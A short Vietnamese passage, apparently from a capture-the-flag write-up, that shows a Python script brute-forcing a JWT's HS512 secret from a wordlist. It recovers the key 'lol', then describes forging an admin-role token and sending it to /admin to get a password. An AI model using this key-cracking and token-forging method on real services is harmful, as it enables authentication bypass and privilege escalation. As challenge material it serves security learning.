Gợi ý khá rõ ràng: Viết 1 script để brute force chuỗi jwt này. Ở đây lấy 1 python script trên mạng:

```python
import jwt

token = input("Enter JWT token:")
files = input("Enter wordlist name:")

# change this to True to verify token expiration
options = { 'verify_exp':False}

with open(files) as seckeys:
	for secret in seckeys:
		try:
			# change algorithm='HS256' to another supported algorithm if necessary 
			payload = jwt.decode(token, secret.rstrip(), algorithm='HS512', options=options)
			print ("Success. Token decoded with the following key:" , secret.rstrip())
			print (payload)
			break
		except jwt.InvalidTokenError:
			print ("Failed to verify token signature with the following key: "  , secret.rstrip())
		except jwt.ExpiredSignatureError:
			print ("Token is Expired")
```

Bằng jwt ta biết đó là algo dạng HS512, chạy script khoảng 30s sẽ ra secret key là `lol`, payloads là `"role":"guest"`

Dùng jwt, đổi role thành admin, thêm secret key vào và gen ra jwt gửi cùng POST request lên /admin, ta có được password